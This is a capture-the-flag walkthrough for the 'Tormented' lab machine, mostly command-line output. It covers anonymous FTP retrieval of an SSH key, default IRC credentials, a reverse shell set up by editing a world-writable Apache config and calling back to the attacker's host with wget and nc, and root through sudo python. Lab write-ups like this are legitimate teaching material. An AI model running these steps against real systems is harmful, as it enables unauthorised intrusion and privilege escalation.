Tormented

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] FTP with weak credentials
[+] ngirc - default crendentials for server
[+] CUPS with no password
[+] Abusing SUDO rights  reboot / apache.cong
[+] Privilege Escalation abusing SUDO rights /usr/bin/python
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/tormented# nmap -sTV -O -A 192.168.56.103 | tee OVAT_tormented
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-13 22:48 EDT
Nmap scan report for wordy (192.168.56.103)
Host is up (0.00081s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
| -rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
| -rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
| -rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
| -rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
| -rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
| -rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
| -rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.4.gz
| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.5.gz
| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
| -rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)
|   256 a5:12:e7:7f:f0:17:ce:f1:6a:a5:bc:1f:69:ac:14:04 (ECDSA)
|_  256 66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)
25/tcp   open  smtp        Postfix smtpd
|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=TORMENT
| Subject Alternative Name: DNS:TORMENT
| Not valid before: 2018-12-23T14:28:47
|_Not valid after:  2028-12-20T14:28:47
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http        Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25
|_http-title: Apache2 Debian Default Page: It works
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  3,4         2049/tcp  nfs
|   100003  3,4         2049/udp  nfs
|   100005  1,2,3      51175/tcp  mountd
|   100005  1,2,3      53945/udp  mountd
|   100021  1,3,4      42963/tcp  nlockmgr
|   100021  1,3,4      45788/udp  nlockmgr
|   100227  3           2049/tcp  nfs_acl
|_  100227  3           2049/udp  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
|_imap-capabilities: more AUTH=PLAIN LITERAL+ have post-login listed IMAP4rev1 AUTH=LOGINA0001 SASL-IR IDLE OK capabilities Pre-login ENABLE LOGIN-REFERRALS ID
445/tcp  open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Bad Request - CUPS v2.2.1
2049/tcp open  nfs_acl     3 (RPC #100227)
6667/tcp open  irc         ngircd
6668/tcp open  irc         ngircd
6669/tcp open  irc         ngircd
MAC Address: 08:00:27:00:E5:11 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2h40m01s, deviation: 4h37m07s, median: -2s
|_nbstat: NetBIOS name: TORMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: torment
|   NetBIOS computer name: TORMENT\x00
|   Domain name: \x00
|   FQDN: torment
|_  System time: 2019-10-14T10:48:38+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-10-13 22:48:38
|_  start_date: N/A

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Accessing FTP and downloading files :  channles

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp> open  192.168.56.103
Connected to 192.168.56.103.
220 vsftpd (broken)
Name (192.168.56.103:setrus): anonymous 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x   11 ftp      ftp          4096 Oct 14 10:51 .
drwxr-xr-x   11 ftp      ftp          4096 Oct 14 10:51 ..
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .cups
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .ftp
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .imap
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .mysql
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .nfs
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ngircd
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .samba
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .smtp
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ssh
-rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
-rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
-rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
-rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
-rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
-rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
-rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.4.gz
-rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.5.gz
-rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
-rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.1.gz
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.2.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.3.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.4.gz
-rw-r--r--    1 ftp      ftp        489389 Dec 28  2018 dpkg.status.5.gz
-rw-r--r--    1 ftp      ftp        470278 Dec 27  2018 dpkg.status.6.gz
-rw-------    1 ftp      ftp          1010 Dec 31  2018 group.bak
-rw-------    1 ftp      ftp           840 Dec 31  2018 gshadow.bak
-rw-------    1 ftp      ftp          2485 Dec 31  2018 passwd.bak
-rw-------    1 ftp      ftp          1575 Dec 31  2018 shadow.bak
226 Directory send OK.

ftp> cd .ngircd
250 Directory successfully changed.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jan 04  2019 channels
226 Directory send OK.

ftp> get channels
local: channels remote: channels
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for channels (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (11.6510 kB/s)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Collectind SSH id_rsa key

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp> open 192.168.56.103
Already connected to 192.168.56.103, use close first.
ftp> user anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Switching to Binary mode.
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .
drwxr-xr-x   11 ftp      ftp          4096 Oct 14 10:51 ..
-rw-r--r--    1 ftp      ftp          1766 Jan 04  2019 id_rsa
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
226 Transfer complete.
1766 bytes received in 0.00 secs (430.0772 kB/s)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Using HexChat we connect to the IRC channel by using the default password for ngirc.
Password : wealllikedebian
![Alt Tag]()

On the CUPS server, http://192.168.56.103:631 we have a list of printers and the username corresponding to the printing jobs

![Alt Tag]()

By using the passphrase got from the IRC channel : 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mostmachineshaveasupersecurekeyandalongpassphrase
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


we are able to login as user :  patrick


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~$ chmod 600 id_rsa 
setrus@host:~$ ssh patrick@192.168.56.103 -i id_rsa 
Enter passphrase for key 'id_rsa': 
patrick@192.168.56.103: Permission denied (publickey).
setrus@host:~$ ssh patrick@192.168.56.103 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan  4 19:34:43 2019 from 192.168.254.139
patrick@TORMENT:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
patrick@TORMENT:/bin$ find / -perm 777 -type f 2</dev/null
/etc/apache2/apache2.conf
/var/www/html/index.html
patrick@TORMENT:/bin$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

After adding the user qiu and Group qiu in /etc/apache2/apache2.conf we are downloading the php-reverse-shell.php

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
patrick@TORMENT:/bin$ nano /etc/apache2/apache2.conf 
patrick@TORMENT:/bin$ cd /var/www/html
patrick@TORMENT:/var/www/html$ wget http://192.168.56.102:8889/php-reverse-shell.php
--2019-10-14 11:28:53--  http://192.168.56.102:8889/php-reverse-shell.php
Connecting to 192.168.56.102:8889... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5496 (5.4K) [application/octet-stream]
Saving to: 'php-reverse-shell.php'

php-reverse-shell.p 100%[===================>]   5.37K  --.-KB/s    in 0s      

2019-10-14 11:28:53 (400 MB/s) - 'php-reverse-shell.php' saved [5496/5496]

patrick@TORMENT:/var/www/html$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Using sudo rights for user patrick we are able to reboot the server.
Getting reverse shell for user qiu


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.103/php-reverse-shell.php

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:/var/www/html# nc -vnlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 46904
Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 11:32:14 up 1 min,  0 users,  load average: 0.69, 0.30, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilge escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ sudo -l 
Matching Defaults entries for qiu on TORMENT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qiu may run the following commands on TORMENT:
    (ALL) NOPASSWD: /usr/bin/python, /bin/systemctl
$ sudo /usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'
root@TORMENT:/# iidd

uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

